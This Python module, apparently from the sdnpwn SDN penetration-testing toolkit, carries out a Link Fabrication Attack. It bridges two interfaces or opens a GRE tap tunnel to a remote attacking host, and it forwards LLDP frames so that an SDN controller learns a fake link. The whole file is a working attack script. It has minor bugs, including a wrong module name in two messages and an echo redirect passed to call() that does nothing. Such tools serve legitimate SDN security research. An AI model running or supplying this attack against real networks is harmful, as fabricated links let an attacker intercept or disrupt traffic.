
import modules.sdnpwn_common as sdnpwn

from subprocess import call
import signal
from time import sleep

def info():
  return "Performs the Link Fabrication Attack (LFA) using a bridge between the two given interfaces, or a bridge and GRE tunnel to link to attacking devices."
  
def usage():

  sdnpwn.addUsage("--iface1", "Set network interface 1", True)
  sdnpwn.addUsage("--iface2", "Set network interface 2", True)
  sdnpwn.addUsage("--relay", "Set relay method (bridge | tunnel)", True)
  sdnpwn.addUsage("--bridge-name", "Set name for bridge (Default is 'br0')")
  sdnpwn.addUsage("--stp", "Allow spanning tree protocol traffic (on | off) (Default 'on')")
  sdnpwn.addUsage("--tunnel-local", "IP address for local tunnel interface (Required for tunnel relay method)")
  sdnpwn.addUsage("--tunnel-remote", "IP address for remote tunnel interface (Required for tunnel relay method)")
  sdnpwn.addUsage("--bridge-ip", "IP address to use for bridge interface (Default '10.10.10.1/24')")
  
  
  return sdnpwn.getUsage()

def signal_handler(signal, frame):
  global endRelay
  endRelay = True
  
  
def run(params):
  global endRelay
  endRelay = False
  
  iface1 = None
  iface2 = None
  bridgeName = "br0"
  relayMethod = None
  stpForwarding = "on"
  bridgeIPAdd = "10.10.10.1/24"
  
  tunnelLocal = None
  tunnelRemote = None
  
  if("--iface1" in params):
    iface1 = params[params.index("--iface1")+1]
  if("--iface2" in params):
    iface2 = params[params.index("--iface2")+1]
  if("--bridge-name " in params):
    bridgeName = params[params.index("--bridge-name ")+1]
  if("--relay" in params):
    relayMethod = params[params.index("--relay")+1]
  if("--stp" in params):
    stpForwarding = params[params.index("--stp")+1]
  if("--tunnel-local" in params):
    tunnelLocal = params[params.index("--tunnel-local")+1]
  if("--tunnel-remote" in params):
    tunnelRemote = params[params.index("--tunnel-remote")+1]
  if("--bridge-ip" in params):
    bridgeIPAdd = params[params.index("--bridge-ip")+1]
  
    
  if(iface1 == None or relayMethod == None):
    sdnpwn.message("Missing options!", sdnpwn.WARNING)
    print(usage())
    return
  
  try:
    if(relayMethod == "bridge"):
      sdnpwn.message("Creating network bridge between " + iface1 + " and " + iface2, sdnpwn.NORMAL)
      call(["ifconfig", iface1, "0", "down"])
      call(["ifconfig", iface2, "0", "down"])
      call(["brctl", "addbr", bridgeName])
      call(["brctl", "addif", bridgeName, iface1])
      call(["brctl", "addif", bridgeName, iface2])
      call(["brctl", "stp", bridgeName, stpForwarding])
      call(["ifconfig", iface1, "up"])
      call(["ifconfig", iface2, "up"])
      call(["ifconfig", bridgeName, "up"])
      call(["echo", "16384", ">", "/sys/class/net/br0/bridge/group_fwd_mask"]) #Prevent silent dropping on LLDP frames
      
      sdn.message("Bridge setup complete!", sdnpwn.SUCCESS)
      
    elif(relayMethod == "tunnel"):
      if(tunnelLocal == None or tunnelRemote == None):
        sdnpwn.message("Missing options!", sdnpwn.WARNING)
        print(usage())
        return
      
      sdnpwn.message("Creating tunnel", sdnpwn.NORMAL)
      call(["ip", "link", "add", bridgeName + "GRETap", "type", "gretap", "local", tunnelLocal, "remote", tunnelRemote])
      call(["ip", "link", "set", "dev", bridgeName + "GRETap", "up"])
      call(["ip", "link", "set", "dev", iface1, "up"])
      call(["brctl", "addbr", bridgeName, bridgeName + "GRETap"])
      call(["brctl", "addif", bridgeName, bridgeName + "GRETap"])
      call(["brctl", "addif", bridgeName, iface1])
      call(["ip", "addr", "add", bridgeIPAdd, "dev", bridgeName])
      call(["ip", "link", "set", bridgeName, "up"])
      call(["echo", "16384", ">", "/sys/class/net/br0/bridge/group_fwd_mask"]) #Prevent silent dropping on LLDP frames
      
      sdn.message("Bridge & Tunnel setup complete!", sdnpwn.SUCCESS)
    
    signal.signal(signal.SIGINT, signal_handler)
    sdnpwn.message("Press Ctrl+C to stop.", sdnpwn.NORMAL)
    
    while(1):
      sleep(3)
      if(endRelay is True):
        break
    
    print("\n")
    sdnpwn.message("Ending attack", sdnpwn.NORMAL)
    
  except PermissionError as e:
    sdnpwn.message("Needs root!", sdnpwn.ERROR)
  except Exception as e:
    sdnpwn.message("An error occured!", sdnpwn.ERROR)
    print(e)
  